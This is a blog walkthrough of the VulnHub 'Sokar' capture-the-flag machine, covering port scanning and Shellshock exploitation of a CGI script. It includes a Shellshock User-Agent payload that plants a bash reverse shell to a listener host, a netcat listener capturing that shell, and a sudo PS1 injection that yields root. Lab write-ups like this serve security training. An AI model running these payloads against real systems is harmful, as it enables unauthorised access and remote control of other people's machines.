---
layout: blog_item
title:  "Sokar - Walkthrough"
date:   2015-02-23 14:00:10
author: Arr0way
description: 'Sokar - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Description

Sokar was a vulnhub competition, unfortunately I did not have enough free time to compete.

**Author:** @_RastaMouse

**Download:** [VulnHub](https://www.vulnhub.com)


## Enumeration

### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.148

{% endhighlight %}


### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 591</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.15 ((CentOS))</p></pc>
           </td>
        </tr>
        </tbody>

</table>
</div>

### HTTP Enumeration

Inspection of the Web Application revealed <code>/cgi-bin/cat</code> which indicated it could be vulnerable to shellshock.

### Shellshock

The Shellshock exploit was used to execute remote commands on the target system, however a reverse shell or bind shell were not possible due to restrictive ingress and egress firewall rules. This made for a painful local enumeration of the system via **Burp Suite**.  

#### Identify Current User

![Shellshock ID](/img/blog/sokar/shellshock-id.png)

#### Shellshock home dir perms

![Shellshock home dir](/img/blog/sokar/shellshock-home-dirs.png)

#### Shellshock files owned by user bynarr  

![Shellshock find command](/img/blog/sokar/shellshock-find.png)

The file <code>/tmp/stats</code> appeared to get updated every few minutes, indicating a cronjob *could* be running.

#### Shellshock mail spool readable

![Shellshock mail](/img/blog/sokar/shellshock-mail.png)

The above disclosed <code>bynarrs</code> passwords and the outbound port <code>51242</code> rule for the user.

## Reverse Shell

The following shellshock payload was sent using Burp Suite:

{% highlight bash %}
User-Agent: () { :;};echo;/bin/echo '/bin/bash -i >& /dev/tcp/192.168.221.139/51242 0>&1 ' > /home/bynarr/.profile;
{% endhighlight %}

The cronjob called the .profile file and execute the file contents.

A reverse shell was successfully spawned as the user <code>bynarr</code>

{% highlight bash %}
[root:~/Downloads]# nc.traditional -lp 51242 -vvvv
listening on [any] 51242 ...
192.168.221.148: inverse host lookup failed: Unknown host
connect to [192.168.221.139] from (UNKNOWN) [192.168.221.148] 59533
bash: no job control in this shell
{% endhighlight %}


## Local Enumeration

The following disclosed several bash environment variables were permitted to run as the user <code>bynarr</code> with sudo permissions.

{% highlight bash %}
[bynarr@sokar ~]$ sudo -l
sudo -l
Matching Defaults entries for bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime

{% endhighlight %}

## Local Privilege Escalation

The following shellshock payload was crafted to successfully escalate permissions to root:

{% highlight bash %}
sudo PS1="() { :;} ;  /bin/sh" /home/bynarr/lime
{% endhighlight %}

## Root Flag

{% highlight bash %}
[bynarr@sokar tmp]$ sudo PS1="() { :;} ;  /bin/sh" /home/bynarr/lime
sudo PS1="() { :;} ;  /bin/sh" /home/bynarr/lime
sh-4.1# ls -la /home/bynarr/lime
ls -la /home/bynarr/lime
-rwxr-xr-x 1 root root 368 Jan 27  2015 /home/bynarr/lime
sh-4.1# cat /root/flag
cat /root/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
{% endhighlight %}

Thanks for the VM :)
